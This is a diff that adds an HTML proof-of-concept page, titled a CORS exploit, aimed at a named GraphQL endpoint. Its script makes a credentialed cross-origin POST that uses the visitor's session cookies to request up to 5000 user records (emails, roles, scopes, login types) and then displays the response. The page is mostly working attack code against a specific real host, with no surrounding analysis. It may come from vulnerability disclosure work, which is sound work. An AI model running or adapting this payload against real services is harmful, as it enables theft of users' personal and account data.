@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Exploit PoC</title>
+</head>
+<body>
+    <h1>CORS Exploit Proof of Concept</h1>
+    <button id="exploit">Exploit</button>
+    <pre id="output"></pre>
+    <script>
+        document.getElementById('exploit').addEventListener('click', function () {
+            var targetUrl = 'https://app-dev.traceable.ai/graphql';
+            var requestBody = JSON.stringify({
+                variables: {},
+                query: `
+                {
+                    users(limit: 5000) {
+                        results {
+                            email
+                            roles {
+                                roleId
+                                id
+                                scope {
+                                    entityScopes {
+                                        type
+                                        ids
+                                        __typename
+                                    }
+                                    __typename
+                                }
+                                __typename
+                            }
+                            loginType
+                            __typename
+                        }
+                        total
+                        __typename
+                    }
+                }`
+            });
+
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', targetUrl, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.withCredentials = true; // Include cookies
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4) {
+                    if (xhr.status >= 200 && xhr.status < 300) {
+                        document.getElementById('output').textContent = xhr.responseText;
+                    } else {
+                        document.getElementById('output').textContent = 'Error: ' + xhr.status;
+                    }
+                }
+            };
+
+            xhr.send(requestBody);
+        });
+    </script>
+</body>
+</html>
